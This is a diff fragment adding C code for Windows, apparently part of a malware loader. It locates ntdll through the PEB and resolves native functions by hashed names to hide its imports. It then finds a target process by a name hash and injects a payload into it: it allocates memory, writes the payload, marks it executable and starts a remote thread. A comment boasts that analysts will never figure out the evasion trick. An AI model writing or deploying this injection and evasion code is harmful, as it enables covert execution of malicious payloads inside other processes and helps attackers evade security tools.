@@ -1,0 +1,143 @@
+    HMODULE ntdllHandle = NULL;
+    HANDLE procHandle   = NULL;
+    HANDLE threadHandle = NULL;
+    PVOID buf           = NULL;
+
+    NTSTATUS status     = 0;
+
+    int sNtdll          = 800254036;
+
+
+    PEB* peb            = (PEB*)__readgsqword(0x30 + 0x30); // they'll never figure this one out.
+    LIST_ENTRY* head    = &peb->Ldr->InLoadOrderModuleList;
+    LIST_ENTRY* curr    = head->Flink;
+
+    while (curr != head) {
+        LDR_DATA_TABLE_ENTRY* entry = containingRecord(curr, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        if (entry->BaseDllName.Buffer) {
+            uint32_t h = 0;
+            wchar_t* tempName = entry->BaseDllName.Buffer;
+            while (*tempName != L'\0') {
+                h = h * 31 + *tempName;
+                tempName++;
+            }
+            if (h == sNtdll) {
+                ntdllHandle = (HMODULE)entry->DllBase;
+                break;
+            }
+        }
+        curr = curr->Flink;
+    } if (!ntdllHandle) return FALSE;
+
+    NtQuerySystemInformation pNtQuerySystemInformation = NULL;
+    NtOpenProcess pNtOpenProcess = NULL;
+    NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
+    NtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
+    NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
+    NtCreateThreadEx pNtCreateThreadEx = NULL;
+    NtWaitForSingleObject pNtWaitForSingleObject = NULL;
+    NtFreeVirtualMemory pNtFreeVirtualMemory = NULL;
+    NtClose pNtClose = NULL;
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllHandle;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)ntdllHandle + dosHeader->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ntdllHandle + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    DWORD* nameRefArray = (DWORD*)((BYTE*)ntdllHandle + exports->AddressOfNames);
+    WORD* ordinalArray = (WORD*)((BYTE*)ntdllHandle + exports->AddressOfNameOrdinals);
+    DWORD* addressArray = (DWORD*)((BYTE*)ntdllHandle + exports->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
+        char* functionName = (char*)((BYTE*)ntdllHandle + nameRefArray[i]);
+
+        unsigned long h = 5381;
+        int ch;
+        char* t = functionName;
+        while ((ch = *t++)) h = ((h << 5) + h) + ch;
+
+        if (h == 3998184360) pNtQuerySystemInformation = (NtQuerySystemInformation)((BYTE*)ntdllHandle + addressArray[ordinalArray[i]]);
+        else if (h == 1342423128) pNtOpenProcess = (NtOpenProcess)((BYTE*)ntdllHandle + addressArray[ordinalArray[i]]);
+        else if (h == 1737737036) pNtAllocateVirtualMemory = (NtAllocateVirtualMemory)((BYTE*)ntdllHandle + addressArray[ordinalArray[i]]);
+        else if (h == 2515773330) pNtWriteVirtualMemory = (NtWriteVirtualMemory)((BYTE*)ntdllHandle + addressArray[ordinalArray[i]]);
+        else if (h == 136929992)  pNtProtectVirtualMemory = (NtProtectVirtualMemory)((BYTE*)ntdllHandle + addressArray[ordinalArray[i]]);
+        else if (h == 3406569776) pNtCreateThreadEx = (NtCreateThreadEx)((BYTE*)ntdllHandle + addressArray[ordinalArray[i]]);
+        else if (h == 1282262588) pNtWaitForSingleObject = (NtWaitForSingleObject)((BYTE*)ntdllHandle + addressArray[ordinalArray[i]]);
+        else if (h == 1192929257) pNtFreeVirtualMemory = (NtFreeVirtualMemory)((BYTE*)ntdllHandle + addressArray[ordinalArray[i]]);
+        else if (h == 2341344061) pNtClose = (NtClose)((BYTE*)ntdllHandle + addressArray[ordinalArray[i]]);
+    }
+
+
+    if (!pNtQuerySystemInformation || !pNtOpenProcess) return FALSE;
+
+    HANDLE hSelf = (HANDLE)-1;
+    SIZE_T pidbufferSize = 0x20000;
+    PVOID pidbuffer = NULL;
+    DWORD targetPid = 0;
+    ULONG returnLength = 0;
+
+    while (TRUE) {
+        status = pNtAllocateVirtualMemory(hSelf, &pidbuffer, 0, &pidbufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (status != 0) return FALSE;
+
+        status = pNtQuerySystemInformation(5, pidbuffer, (ULONG)pidbufferSize, &returnLength);
+        if (status == 0) {
+            break;
+        }
+        SIZE_T zeroSize = 0;
+        pNtFreeVirtualMemory(hSelf, &pidbuffer, &zeroSize, MEM_RELEASE);
+        pidbuffer = NULL;
+        if (status == 0xC0000004L) {
+
+            pidbufferSize = (SIZE_T)returnLength + 0x2000;
+            continue;
+        } else {
+            return FALSE;
+        }
+    }
+
+    SYSTEM_PROCESS_INFORMATION* pInfo = (SYSTEM_PROCESS_INFORMATION*)pidbuffer;
+    while (TRUE) {
+        if (pInfo->ImageName.Buffer) {
+            uint32_t h = 0;
+            wchar_t* t = pInfo->ImageName.Buffer;
+            USHORT len = pInfo->ImageName.Length / sizeof(wchar_t);
+            for (USHORT i = 0; i < len; i++) {
+                h = h * 31 + t[i];
+            }
+
+            if (h == sProc) {
+                targetPid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
+                break;
+            }
+        }
+        if (pInfo->NextEntryOffset == 0) break;
+        pInfo = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)pInfo + pInfo->NextEntryOffset);
+    }
+
+    SIZE_T cleanupSize = 0;
+    pNtFreeVirtualMemory(hSelf, &pidbuffer, &cleanupSize, MEM_RELEASE);
+
+    if (targetPid == 0) return FALSE;
+
+    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
+    CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)targetPid, NULL };
+
+    if (pNtOpenProcess(&procHandle, PROCESS_ALL_ACCESS, &objAttr, &clientId) != 0) return FALSE;
+
+    status = pNtAllocateVirtualMemory(procHandle, &buf, 0, (PSIZE_T)&payloadsize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    if (status == 0) {
+        SIZE_T written = 0;
+        pNtWriteVirtualMemory(procHandle, buf, payload, payloadsize, &written);
+
+        DWORD oldProt = 0;
+        pNtProtectVirtualMemory(procHandle, &buf, (PSIZE_T)&payloadsize, PAGE_EXECUTE_READ, &oldProt);
+
+        if (pNtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, &objAttr, procHandle, buf, NULL, FALSE, 0, 0, 0, NULL) == 0) {
+            pNtWaitForSingleObject(threadHandle, FALSE, NULL);
+            pNtClose(threadHandle);
+        }
+    }
+
+    if (procHandle) pNtClose(procHandle);
+    return (status == 0);
+}
